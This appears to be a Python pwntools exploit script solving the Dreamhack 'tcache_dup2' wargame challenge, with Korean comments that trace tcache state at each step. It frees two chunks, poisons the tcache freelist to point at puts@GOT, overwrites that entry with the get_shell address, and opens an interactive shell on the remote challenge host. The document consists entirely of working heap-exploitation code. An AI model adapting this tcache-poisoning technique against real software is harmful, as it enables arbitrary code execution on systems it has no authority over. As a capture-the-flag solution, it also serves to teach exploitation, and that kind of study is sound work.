from pwn import *

p = remote('host3.dreamhack.games', 17171)
elf = ELF('./tcache_dup2')


def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)


def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())


# malloc -> free를 2번 연속으로 해줘서 tc_idx = 2으로 만든 후, tcache_poisoning에서 tc_idx = 0이 되지 않도록 세팅
# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[0]
create(0x20, b'a')
# tcache[0x20] : empty
# chunk : ptr[1]
create(0x20, b'b')


# tcache[0x20] : ptr[0]
# tc_idx = 1
# chunk : ptr[1]
delete(0)
# tcache[0x20] : ptr[1] -> ptr[0]
# tc_idx = 2
# chunk : ptr[1]
delete(1)


# tcache[0x20] : ptr[1] -> puts@got
# tc_idx = 2
# chunk : ptr[1]
puts_got = elf.got['puts']
modify(1, 0x10, p64(puts_got))


# tcache[0x20] : puts@got
# tc_idx = 1
# chunk : ptr[2]
create(0x20, b'a')


# tcache[0x20] : empty
# tc_idx = 0
# chunk : ptr[3]
get_shell = elf.symbols['get_shell']
create(0x20, p64(get_shell))

p.interactive()
